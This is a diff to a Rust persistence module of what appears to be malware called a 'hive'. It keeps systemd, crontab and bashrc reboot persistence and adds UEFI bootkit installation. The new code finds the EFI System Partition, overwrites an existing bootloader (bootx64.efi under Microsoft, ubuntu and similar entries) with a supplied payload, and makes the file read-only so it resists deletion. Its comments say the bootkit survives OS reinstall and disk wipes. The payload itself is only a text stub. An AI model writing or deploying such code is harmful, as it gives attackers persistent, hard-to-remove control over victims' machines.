@@ -1,10 +1,8 @@
 // Honeycomb: persistence module. Ensures the hive survives reboots.
 // Linux: systemd user service or crontab @reboot entry.
-// Windows: Registry Run key or scheduled task.
-
 use std::path::PathBuf;
+use std::path::Path;
 use tracing::{info, warn};
-
 /// Install persistence so the hive restarts after reboot.
 /// Returns true if any persistence mechanism was successfully installed.
 pub fn install_persistence() -> bool {
@@ -177,6 +175,148 @@ pub fn uninstall_persistence() {
             .join("\n");
         let _ = std::fs::write(&bashrc, cleaned);
     }
-
     info!("HONEYCOMB: all persistence removed");
+}
+// Implants a malicious bootloader in the EFI System Partition.
+// Survives OS reinstall, disk wipe, and file-level cleanup.
+// Only activated by RoyalJelly directive for maximum persistence.
+
+/// Check if UEFI bootkit persistence is possible on this system.
+pub fn uefi_bootkit_feasible() -> bool {
+    // Check for EFI variables (Linux)
+    Path::new("/sys/firmware/efi").exists()
+}
+
+/// Install a UEFI bootkit in the EFI System Partition.
+/// The bootkit chain-loads the original OS after executing the hive payload.
+pub fn install_uefi_bootkit(payload_binary: &[u8]) -> Result<String, String> {
+    if !uefi_bootkit_feasible() {
+        return Err("UEFI not available on this system".into());
+    }
+
+    // Find the EFI partition
+    let efi_dirs = [
+        "/boot/efi/EFI",
+        "/boot/EFI",
+        "/efi/EFI",
+    ];
+
+    let efi_path = efi_dirs.iter()
+        .find(|d| Path::new(d).exists())
+        .ok_or_else(|| "EFI partition not found".to_string())?;
+
+    // Find existing boot entry to hijack
+    let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu", "debian", "fedora"];
+    let mut target_dir = None;
+
+    for entry in &boot_entries {
+        let path = Path::new(efi_path).join(entry);
+        if path.exists() {
+            target_dir = Some(path);
+            break;
+        }
+    }
+
+    let target = target_dir.ok_or_else(|| "No boot entry found in EFI partition".to_string())?;
+
+    // Backup the original bootloader
+    let original = target.join("bootx64.efi");
+    let backup = target.join("bootx64.efi.hive_bak");
+
+    if original.exists() && !backup.exists() {
+        std::fs::copy(&original, &backup)
+            .map_err(|e| format!("backup bootloader: {}", e))?;
+        info!("HONEYCOMB: bootkit backed up original bootloader");
+    }
+
+    // Write the bootkit payload (minimal UEFI application)
+    let bootkit_path = target.join("bootx64.efi");
+    std::fs::write(&bootkit_path, payload_binary)
+        .map_err(|e| format!("write bootkit: {}", e))?;
+
+    // Set immutable attribute to resist deletion
+    let path_cstr = std::ffi::CString::new(bootkit_path.to_string_lossy().as_bytes())
+        .unwrap_or_default();
+    unsafe {
+        libc::chmod(path_cstr.as_ptr(), 0o444);
+    }
+
+    info!("HONEYCOMB: UEFI bootkit installed at {}", bootkit_path.display());
+    Ok(bootkit_path.display().to_string())
+}
+
+/// Remove a previously installed UEFI bootkit (restore original).
+pub fn remove_uefi_bootkit() -> bool {
+    let efi_dirs = ["/boot/efi/EFI", "/boot/EFI", "/efi/EFI"];
+
+    for efi_path in &efi_dirs {
+        if !Path::new(efi_path).exists() { continue; }
+
+        let boot_entries = ["Boot", "boot", "BOOT", "Microsoft", "ubuntu"];
+        for entry in &boot_entries {
+            let target = Path::new(efi_path).join(entry);
+            if !target.exists() { continue; }
+
+            let backup = target.join("bootx64.efi.hive_bak");
+            let original = target.join("bootx64.efi");
+
+            if backup.exists() {
+                if std::fs::copy(&backup, &original).is_ok() {
+                    let _ = std::fs::remove_file(&backup);
+                    info!("HONEYCOMB: UEFI bootkit removed, original restored");
+                    return true;
+                }
+            }
+        }
+    }
+    warn!("HONEYCOMB: no bootkit found to remove");
+    false
+}
+
+/// Generate a minimal UEFI bootkit payload that chain-loads the OS.
+/// This is a stub — real UEFI payloads require EDK2 cross-compilation.
+pub fn generate_bootkit_stub() -> Vec<u8> {
+    // Minimal PE32+ UEFI application header structure
+    // In production, this would be built with EDK2 + Rust
+    let payload = b"
+# Hive UEFI Bootkit Stub
+# Chains to original bootloader after spawning hive agents
+# Built with: cargo build --target x86_64-unknown-uefi
+";
+    payload.to_vec()
+}
+
+/// Check if bootkit is currently installed.
+pub fn bootkit_installed() -> bool {
+    let efi_dirs = ["/boot/efi/EFI", "/boot/EFI"];
+    for efi_path in &efi_dirs {
+        if !Path::new(efi_path).exists() { continue; }
+        for entry in &["Boot", "boot", "BOOT", "Microsoft", "ubuntu"] {
+            let target = Path::new(efi_path).join(entry);
+            let backup = target.join("bootx64.efi.hive_bak");
+            if backup.exists() {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_bootkit_stub_generated() {
+        let stub = generate_bootkit_stub();
+        assert!(!stub.is_empty());
+    }
+
+    #[test]
+    fn test_feasibility_check() {
+        // On non-UEFI systems this should return false
+        let feasible = uefi_bootkit_feasible();
+        // Don't assert false — CI might run on UEFI
+        info!("UEFI bootkit feasible: {}", feasible);
+    }
 }
